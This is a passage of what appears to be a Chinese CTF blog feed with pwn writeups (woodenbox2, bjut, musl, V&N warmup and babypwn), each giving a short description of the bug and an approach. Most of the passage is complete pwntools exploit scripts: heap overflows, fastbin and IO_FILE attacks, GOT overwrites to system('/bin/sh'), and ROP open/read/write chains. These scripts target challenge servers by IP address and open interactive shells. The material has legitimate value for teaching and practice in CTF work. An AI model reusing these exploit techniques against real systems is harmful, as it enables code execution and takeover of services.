0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto 